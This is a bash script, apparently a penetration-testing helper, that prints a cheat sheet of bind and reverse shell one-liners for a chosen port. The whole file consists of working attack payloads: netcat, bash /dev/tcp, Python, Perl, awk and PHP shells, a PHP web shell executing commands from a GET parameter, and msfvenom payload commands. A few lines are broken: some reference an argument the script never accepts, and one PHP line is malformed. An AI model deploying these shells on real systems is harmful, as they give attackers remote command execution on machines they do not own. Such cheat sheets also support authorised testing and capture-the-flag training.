#!/bin/bash

#Conchology:
#The scientific study or collection of mollusc shells.

# $1 remote machine's port to listen on

# list of BIND shells


RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Display error if not enough arguments given
if [ $# -ne 1 ]; then
	printf " ${RED}Usage: ${NC} ./bind_Concho.sh [remote_listen_port] \n"
	exit 1
fi

conchofilename=$(tr -dc 'A-Za-z' < /dev/urandom | fold -$((RANDOM%10+3)) | head -1)

printf "${YELLOW}Note that all shells are unencrypted, and may be vulnerable to interception.\n\n\n${NC}"



# Netcat Bind shells
printf ".. Netcat without '-e' Bind Shell ..\n.-------------------------------.\n"
printf "rm /tmp/$conchofilename;mkfifo /tmp/$conchofilename;cat /tmp/$conchofilename|/bin/sh -i 2>&1|nc -lvp $1 >/tmp/$conchofilename\n"
printf ".-------------------------------.\n\n"

printf ".. Netcat with '-e' Bind Shell ..\n.-------------------------------.\n"
printf "nc -lnvp $1 -e /bin/sh\nnc.exe -lnvp $1 -e cmd.exe\n"
printf ".-------------------------------.\n\n"


#Command Line Shells
printf ".. Pure Bash RevShell ..\n.-------------------------------.\n"
printf "bash -i >& /dev/tcp/$1/$2 0>&1\n"
printf ".-------------------------------.\n\n"

printf ".. Python Bind Shell ..\n.-------------------------------.\n"
printf "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"\",$1));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'\n"
printf ".-------------------------------.\n\n"


printf "python -c 'import os;os.system(\"rm /tmp/$conchofilename; mkfifo /tmp/$conchofilename; cat /tmp/$conchofilename|/bin/sh -i 2>&1|nc $1 $2 > /tmp/$conchofilename\")'\n"
printf ".-------------------------------.\n\n"

printf ".. Perl Bind Shell ..\n.-------------------------------.\n"

printf "perl -e 'use Socket;\$p=$1;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in(\$p, INADDR_ANY));listen(S,SOMAXCONN);for(;\$p=accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");};'\n"

printf ".-------------------------------.\n\n"

printf ".. awk (Non-interactive) Bind Shell ..\n.-------------------------------.\n"

printf "awk -v LPORT=$1 'BEGIN {s = \"/inet/tcp/\" LPORT \"/0/0\";while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;while (c && (c |& getline) > 0) print \$0 |& s; close(c)}}'\n"

printf ".-------------------------------.\n\n"




printf ".. PHP CLI Bind Shell ..\n.-------------------------------.\n"
printf "php -r '\$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind(\$s,\"0.0.0.0\",$1);socket_listen(\$s,1);\$cl=socket_accept(\$s);while(1){if(!socket_write(\$cl,\"\$ \",2))exit;\$in=socket_read(\$cl,100);\$cmd=popen(\"\$in\",\"r\");while(!feof(\$cmd)){\$m=fgetc(\$cmd);socket_write(\$cl,\$m,strlen(\$m));}}'\n"

printf ".-------------------------------.\n\n"

#PHP Shell Payloads
printf ".. PHP WebPage Microshell ..\n.-------------------------------.\n"
printf "<?php passthru(\$_GET[\"cmd\"]); ?>\n\n"


printf ".. PHP VisitMe Shell ..\n.-------------------------------.\n"
printf "<?php passthru(\"${YELLOW}ENTER COMMANDS${NC}\"]); ?>\n"
printf "<?php passthru(\"rm /tmp/$conchofilename;mkfifo /tmp/$conchofilename;cat /tmp/$conchofilename|/bin/sh -i 2>&1|nc -lvp $1 >/tmp/$conchofilename\"); ?>\n"
printf ".-------------------------------.\n\n"


#MSFVenom Quick Reference
printf ".. MSFVenom Bindshell Quick Reference ..\n.-------------------------------.\n"
printf "!!! Remember to add bad characters and other parameters as needed !!! \n\n"

printf "Common (Stageless) MSFVenom Bind Shells\n.-------------------------------.\n"

printf "msfvenom -p linux/${GREEN}x86${NC}/shell_bind_tcp LPORT=$1 -a ${GREEN}x86${NC} --platform linux exitfunc=thread -f [FORMAT_TYPE]\n"
printf "msfvenom -p linux/${YELLOW}x64${NC}/shell_bind_tcp LPORT=$1 -a ${YELLOW}x64${NC} --platform linux exitfunc=thread -f [FORMAT_TYPE]\n\n"

printf "msfvenom -p windows/shell_reverse_tcp LPORT=$1 -a ${GREEN}x86${NC} --platform windows exitfunc=thread -f [FORMAT_TYPE]\n"
printf "msfvenom -p windows/x64/shell_bind_tcp LPORT=$1 -a ${YELLOW}x64${NC} --platform windows exitfunc=thread -f [FORMAT_TYPE]\n\n"

printf "msfvenom -p java/jsp_shell_bind_tcp LPORT=$1 exitfunc=thread -f war \n\n"
printf ".-------------------------------.\n\n\n"

unset conchofilename

printf "When ready, connect with...\n nc "

